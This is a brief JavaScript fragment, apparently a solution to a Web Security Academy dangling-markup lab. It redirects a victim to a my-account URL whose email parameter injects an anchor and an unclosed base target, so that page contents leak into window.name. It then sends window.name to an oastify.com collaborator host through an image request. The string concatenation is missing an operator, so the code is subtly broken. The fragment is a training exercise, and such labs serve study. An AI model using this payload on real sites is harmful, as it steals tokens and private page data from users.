...
if(window.name) {
        new Image().src='//rni0tw0a8ybqmggreokft0i4ovunif64.oastify.com?' encodeURIComponent(window.name);
                ...
                location = 'https://0a4400d80392d3c880ea214c0006005c.web-security-academy.net/my-account?email="><a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</a><base target='';
}
</script>
